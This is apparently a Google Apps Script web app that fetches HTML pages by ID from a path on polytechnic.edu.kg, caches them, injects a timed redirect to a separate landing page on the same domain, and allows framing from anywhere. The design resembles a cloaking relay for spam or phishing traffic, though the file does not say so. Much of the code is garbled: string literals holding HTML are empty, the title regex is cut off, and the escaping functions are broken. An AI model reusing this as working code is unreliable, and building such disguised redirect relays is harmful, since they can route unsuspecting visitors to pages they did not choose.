// ============================================================ // CONFIG // ============================================================ const HTML_BASE_URL = "https://polytechnic.edu.kg/nabaka/"; const REDIRECT_DELAY = 2000; const LANDING_URL = "https://polytechnic.edu.kg/hadia/"; // Cache duration: 6 hours const CACHE_SECONDS = 21600; // ============================================================ // MAIN // ============================================================ function doGet(e) { // ---------------------------------------------------------- // ?id=ABC123 // ---------------------------------------------------------- const id = e && e.parameter && e.parameter.id ? String(e.parameter.id).trim() : ""; // ---------------------------------------------------------- // ID MISSING // ---------------------------------------------------------- if (!id) { return createErrorPage( "ID missing", "Please provide an ID." ); } // ---------------------------------------------------------- // VALIDATE ID // ---------------------------------------------------------- if (!isValidId(id)) { return createErrorPage( "Invalid ID", "The supplied ID contains invalid characters." ); } // ---------------------------------------------------------- // CACHE // ---------------------------------------------------------- const cache = CacheService.getScriptCache(); const cacheKey = "html_" + hashId(id); let html = cache.get(cacheKey); // ---------------------------------------------------------- // FETCH ONLY IF NOT CACHED // ---------------------------------------------------------- if (!html) { const htmlUrl = HTML_BASE_URL + encodeURIComponent(id) + ".html"; try { // ------------------------------------------------------ // FETCH HTML // ------------------------------------------------------ const response = UrlFetchApp.fetch( htmlUrl, { method: "get", muteHttpExceptions: true, followRedirects: true, validateHttpsCertificates: true } ); const statusCode = response.getResponseCode(); // ------------------------------------------------------ // HTTP ERROR // ------------------------------------------------------ if (statusCode !== 200) { return createErrorPage( "Page not found", "File " + escapeHtml(id + ".html") + " could not be loaded." ); } // ------------------------------------------------------ // GET HTML // ------------------------------------------------------ html = response.getContentText("UTF-8"); // ------------------------------------------------------ // CACHE HTML // ------------------------------------------------------ try { cache.put( cacheKey, html, CACHE_SECONDS ); } catch (cacheError) { // Cache failure should not break the page } } catch (error) { return createErrorPage( "Error", escapeHtml( error && error.message ? error.message : "Unknown error" ) ); } } // ---------------------------------------------------------- // EXTRACT TITLE // ---------------------------------------------------------- let title = extractTitle(html); if (!title) { title = id; } // ---------------------------------------------------------- // ADD REDIRECT // ---------------------------------------------------------- html = addRedirect( html, LANDING_URL, REDIRECT_DELAY ); // ---------------------------------------------------------- // RETURN HTML // ---------------------------------------------------------- return HtmlService .createHtmlOutput(html) .setTitle(title) .setXFrameOptionsMode( HtmlService.XFrameOptionsMode.ALLOWALL ); } // ============================================================ // VALIDATE ID // ============================================================ function isValidId(id) { if (!id) { return false; } /* * Unicode-friendly validation. * * Allows: * - English * - বাংলা * - हिन्दी * - ไทย * - العربية * - 日本語 * - Numbers * - Hyphen * - Underscore * - Dot * - Spaces * * Blocks: * / * \ * ? * # * % */ return !/[\/\\?#%]/.test(id); } // ============================================================ // HASH ID FOR CACHE KEY // ============================================================ function hashId(text) { const digest = Utilities.computeDigest( Utilities.DigestAlgorithm.MD5, text, Utilities.Charset.UTF_8 ); return digest .map(function(byte) { const value = byte < 0 ? byte + 256 : byte; return ( "0" + value.toString(16) ).slice(-2); }) .join(""); } // ============================================================ // EXTRACT TITLE // ============================================================ function extractTitle(html) { if (!html) { return ""; } const match = html.match( /]*>([\s\S]*?)<\/title>/i ); if (!match) { return ""; } return match[1] // Remove HTML tags .replace(/<[^>]*>/g, "") // Decode common HTML entities .replace(/&/gi, "&") .replace(/"/gi, '"') .replace(/'/gi, "'") .replace(/</gi, "<") .replace(/>/gi, ">") // Normalize spaces .replace(/\s+/g, " ") .trim(); } // ============================================================ // ADD REDIRECT // ============================================================ function addRedirect( html, landingUrl, delay ) { // ---------------------------------------------------------- // Escape URL for JavaScript // ---------------------------------------------------------- const safeUrl = String(landingUrl) .replace(/\\/g, "\\\\") .replace(/"/g, '\\"'); // ---------------------------------------------------------- // Safe numeric delay // ---------------------------------------------------------- const safeDelay = Math.max( 0, Number(delay) || 0 ); // ---------------------------------------------------------- // Redirect script // ---------------------------------------------------------- const redirectCode = ""; // ---------------------------------------------------------- // Insert before // ---------------------------------------------------------- if (/<\/body\s*>/i.test(html)) { return html.replace( /<\/body\s*>/i, redirectCode + "" ); } // ---------------------------------------------------------- // No // ---------------------------------------------------------- return html + redirectCode; } // ============================================================ // ERROR PAGE // ============================================================ function createErrorPage( title, message ) { const html = "" + "" + "" + "" + "" + "" + escapeHtml(title) + "" + "" + "" + "

" + escapeHtml(title) + "

" + "

" + message + "

" + "" + ""; return HtmlService .createHtmlOutput(html) .setTitle(title) .setXFrameOptionsMode( HtmlService.XFrameOptionsMode.ALLOWALL ); } // ============================================================ // HTML ESCAPE // ============================================================ function escapeHtml(text) { return String(text) .replace(/&/g, "&") .replace(//g, ">") .replace(/"/g, """) .replace(/'/g, "'"); }
